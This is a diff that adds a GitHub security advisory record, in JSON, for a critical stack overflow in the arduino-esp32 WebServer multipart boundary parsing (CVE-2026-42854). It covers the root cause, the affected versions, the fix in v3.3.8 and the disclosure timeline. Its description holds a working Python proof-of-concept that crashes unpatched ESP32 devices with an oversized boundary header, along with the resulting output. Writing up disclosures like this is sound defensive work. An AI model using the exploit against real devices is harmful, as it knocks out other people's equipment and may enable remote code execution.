@@ -1,0 +1,118 @@
+{
+ "author": null,
+ "closed_at": null,
+ "collaborating_teams": null,
+ "collaborating_users": null,
+ "created_at": null,
+ "credits": [
+  {
+   "login": "gladiator9797",
+   "type": "reporter"
+  }
+ ],
+ "credits_detailed": [
+  {
+   "state": "accepted",
+   "type": "reporter",
+   "user": {
+    "avatar_url": "https://avatars.githubusercontent.com/u/38899223?v=4",
+    "events_url": "https://api.github.com/users/gladiator9797/events{/privacy}",
+    "followers_url": "https://api.github.com/users/gladiator9797/followers",
+    "following_url": "https://api.github.com/users/gladiator9797/following{/other_user}",
+    "gists_url": "https://api.github.com/users/gladiator9797/gists{/gist_id}",
+    "gravatar_id": "",
+    "html_url": "https://github.com/gladiator9797",
+    "id": 38899223,
+    "login": "gladiator9797",
+    "node_id": "MDQ6VXNlcjM4ODk5MjIz",
+    "organizations_url": "https://api.github.com/users/gladiator9797/orgs",
+    "received_events_url": "https://api.github.com/users/gladiator9797/received_events",
+    "repos_url": "https://api.github.com/users/gladiator9797/repos",
+    "site_admin": false,
+    "starred_url": "https://api.github.com/users/gladiator9797/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/gladiator9797/subscriptions",
+    "type": "User",
+    "url": "https://api.github.com/users/gladiator9797",
+    "user_view_type": "public"
+   }
+  }
+ ],
+ "cve_id": "CVE-2026-42854",
+ "cvss": {
+  "score": 9.8,
+  "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+ },
+ "cvss_severities": {
+  "cvss_v3": {
+   "score": 9.8,
+   "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+  },
+  "cvss_v4": {
+   "score": null,
+   "vector_string": null
+  }
+ },
+ "cwe_ids": [
+  "CWE-121"
+ ],
+ "cwes": [
+  {
+   "cwe_id": "CWE-121",
+   "name": "Stack-based Buffer Overflow"
+  }
+ ],
+ "description": "## Summary\r\n\r\n  The `WebServer` multipart form parser in arduino-esp32 allocates a Variable Length Array (VLA) on the stack whose size is derived from an attacker-controlled HTTP header field (`Content-Type: multipart/form-data; boundary=...`) without enforcing any length limit. Sending a boundary string longer than ~8000 characters overflows the 8192-byte task stack of the `loopTask`, causing a crash and potential remote code execution.\r\n\r\n  ## Affected component\r\n\r\n  - Repository: `espressif/arduino-esp32`\r\n  - File: `libraries/WebServer/src/Parsing.cpp`, lines 505\u2013507\r\n  - Versions: all releases up to and including **3.3.7**\r\n\r\n  ## Root cause\r\n\r\n  ```cpp\r\n  // Parsing.cpp:505-507 \u2014 boundary comes from Content-Type header, no length check int fastBoundaryLen = 4 /* \\r\\n-- */ + boundary.length() + 1 /* \\0 */;\r\n  char fastBoundary[fastBoundaryLen];  // VLA allocated on task stack snprintf(fastBoundary, fastBoundaryLen, \"\\r\\n--%s\", boundary.c_str());\r\n\r\n  The boundary is extracted at line 171 with no validation:\r\n  boundaryStr = headerValue.substring(headerValue.indexOf('=') + 1);\r\n\r\n  The ESP32 Arduino loopTask runs with an 8192-byte stack. A boundary string of ~8000+ characters causes fastBoundaryLen to exceed the remaining stack space, overflowing into heap memory below the stack and triggering a crash. RFC 2046 defines a maximum boundary length of 70 characters.\r\n\r\n  Proof of Concept\r\n\r\n  Victim firmware: Any Arduino-ESP32 sketch that registers an HTTP upload handler,\r\n  e.g. server.on(\"/upload\", HTTP_POST, handleUpload, handleFileUpload).\r\n\r\n  Attacker script (exploit_webserver_vla.py):\r\n\r\n  import socket, sys\r\n\r\n  target = sys.argv[1]  # ESP32 IP\r\n  boundary = \"A\" * 12000  # 12 KB \u2192 guaranteed stack overflow\r\n\r\n  body  = f\"--{boundary}\\r\\n\"\r\n  body += 'Content-Disposition: form-data; name=\"file\"; filename=\"t.txt\"\\r\\n'\r\n  body += \"Content-Type: text/plain\\r\\n\\r\\n\"\r\n  body += \"test\\r\\n\"\r\n  body += f\"--{boundary}--\\r\\n\"\r\n\r\n  req  = f\"POST /upload HTTP/1.1\\r\\nHost: {target}\\r\\n\"\r\n  req += f\"Content-Type: multipart/form-data; boundary={boundary}\\r\\n\"\r\n  req += f\"Content-Length: {len(body)}\\r\\nConnection: close\\r\\n\\r\\n\"\r\n  req += body\r\n\r\n  s = socket.socket(); s.settimeout(10); s.connect((target, 80))\r\n  s.send(req.encode())\r\n  try:\r\n      s.recv(4096)\r\n  except (socket.timeout, ConnectionResetError):\r\n      print(\"CRASHED\")\r\n\r\n  Result on ESP32-D0WD-V3 rev3.1 (arduino-esp32 v3.3.7):\r\n\r\n  Attacker side:\r\n  [*] Target: 192.168.4.1:80\r\n  [*] Boundary length: 12000 chars\r\n  [*] VLA allocation: 12005 bytes on 8192-byte stack\r\n  [*] Sending...\r\n  [!] Connection reset - device CRASHED!\r\n\r\n  ESP32 serial output:\r\n  Guru Meditation Error: Core  0 panic'ed (LoadProhibited). Exception was unhandled.\r\n  Core  0 register dump:\r\n  ...\r\n  ***ERROR*** A stack overflow in task loopTask has been detected.\r\n  Rebooting...\r\n\r\n  Device rebooted immediately. Attack is reliably reproducible (100% crash rate on\r\n  every attempt).\r\n\r\n  Impact\r\n\r\n  Any ESP32 device running an Arduino WebServer with a file upload handler is vulnerable. A single unauthenticated HTTP request over Wi-Fi crashes the device. Stack smashing may enable remote code execution depending on heap layout and attacker-controlled boundary content.\r\n\r\n  Fix\r\n\r\n  Fixed in PR #12486 (commit bb86048), released in arduino-esp32 v3.3.8 (2026-04-12). The fix enforces RFC 2046's 70-character maximum boundary length before the VLA is allocated:\r\n\r\n  // Parsing.cpp \u2014 fix in bb86048\r\n  if (boundary.length() > 70) {\r\n      return _parseFormUploadAborted();\r\n  }\r\n\r\n  Timeline\r\n\r\n  - 2026-03-27: Vulnerability reported to bugbounty@espressif.com with encrypted attachment\r\n  - 2026-04-01: Fix merged in PR #12486\r\n  - 2026-04-12: Fix released in arduino-esp32 v3.3.8\r\n  - 2026-04-13: Espressif confirmed fix\r\n  - 2026-04-22: Reporter submit GHAS\r\n  ---",
+ "ghsa_id": "GHSA-8cmm-3887-r32j",
+ "html_url": "https://github.com/espressif/arduino-esp32/security/advisories/GHSA-8cmm-3887-r32j",
+ "identifiers": [
+  {
+   "type": "GHSA",
+   "value": "GHSA-8cmm-3887-r32j"
+  },
+  {
+   "type": "CVE",
+   "value": "CVE-2026-42854"
+  }
+ ],
+ "private_fork": null,
+ "published_at": "2026-04-28T20:38:48Z",
+ "publisher": {
+  "avatar_url": "https://avatars.githubusercontent.com/u/32426024?v=4",
+  "events_url": "https://api.github.com/users/lucasssvaz/events{/privacy}",
+  "followers_url": "https://api.github.com/users/lucasssvaz/followers",
+  "following_url": "https://api.github.com/users/lucasssvaz/following{/other_user}",
+  "gists_url": "https://api.github.com/users/lucasssvaz/gists{/gist_id}",
+  "gravatar_id": "",
+  "html_url": "https://github.com/lucasssvaz",
+  "id": 32426024,
+  "login": "lucasssvaz",
+  "node_id": "MDQ6VXNlcjMyNDI2MDI0",
+  "organizations_url": "https://api.github.com/users/lucasssvaz/orgs",
+  "received_events_url": "https://api.github.com/users/lucasssvaz/received_events",
+  "repos_url": "https://api.github.com/users/lucasssvaz/repos",
+  "site_admin": false,
+  "starred_url": "https://api.github.com/users/lucasssvaz/starred{/owner}{/repo}",
+  "subscriptions_url": "https://api.github.com/users/lucasssvaz/subscriptions",
+  "type": "User",
+  "url": "https://api.github.com/users/lucasssvaz",
+  "user_view_type": "public"
+ },
+ "severity": "critical",
+ "state": "published",
+ "submission": null,
+ "summary": "Stack buffer overflow in WebServer multipart boundary parsing leads to remote crash potential RCE",
+ "updated_at": "2026-05-04T14:35:18Z",
+ "url": "https://api.github.com/repos/espressif/arduino-esp32/security-advisories/GHSA-8cmm-3887-r32j",
+ "vulnerabilities": [
+  {
+   "package": {
+    "ecosystem": "espressif",
+    "name": "espressif/arduino-esp32"
+   },
+   "patched_versions": ">=3.3.8",
+   "vulnerable_functions": [],
+   "vulnerable_version_range": "<= 3.3.7"
+  }
+ ],
+ "withdrawn_at": null
+}
